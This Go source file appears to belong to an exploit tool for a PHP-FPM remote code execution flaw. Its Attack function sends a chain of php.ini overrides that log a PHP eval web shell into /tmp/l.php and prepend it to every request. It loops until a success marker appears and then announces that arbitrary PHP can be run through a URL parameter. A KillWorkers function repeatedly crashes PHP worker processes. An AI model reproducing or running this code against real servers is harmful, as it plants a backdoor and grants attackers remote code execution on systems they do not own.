package main

import (
	"bytes"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"time"
)

var (
	successPattern = "3422557222"
	codeParams     = url.Values{
		"a": []string{
			`file_put_contents('/tmp/l.php','<?php eval($_GET["a"]);return;?>');echo 0xdeadbeef-313371337;`},
		"v": []string{`<?eval($_GET['a']);?>`},
	}.Encode() + "&"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func Attack(o *Overrider) error {
	log.Printf("Performing attack using php.ini settings...")

	chain := []*struct {
		Set     func(string, string) (*http.Response, []byte, error)
		Payload string
	}{
		{o.PHPValue, "short_open_tag=1;;;.php"},
		{o.PHPValue, "html_errors=0;;;;;;.php"},
		{o.PHPValue, "include_path=/tmp;;.php"},
		{o.PHPValue, "auto_prepend_file=l.php"},
		{o.PHPValue, "log_errors=1;;;;;;;.php"},
		{o.PHPValue, "error_reporting=10;.php"},
		{o.PHPValue, "   error_log=/tmp/l.php"},
		{o.RequestBodyFile, `<?${$_GET/*.php`},
		{o.RequestBodyFile, `*/["v"]}?>x.php`},
	}

attackLoop:
	for {
		for _, item := range chain {
			_, body, err := item.Set(item.Payload, codeParams)
			if err != nil {
				return err
			}
			if bytes.Contains(body, []byte(successPattern)) {
				log.Printf(`Success! Should be able to execute a command by appending "?a=<php code>" to URLs`)
				break attackLoop
			}
		}

		rand.Shuffle(len(chain), func(i, j int) {
			t := chain[i]
			chain[i] = chain[j]
			chain[j] = t
		})
	}
	return nil
}

func KillWorkers(requester *Requester, params *AttackParams, killCount int) error {
	for i := 0; i < killCount; i++ {
		if _, _, err := requester.Request(BreakingPayload, params); err != nil {
			return err
		}
	}
	return nil
}
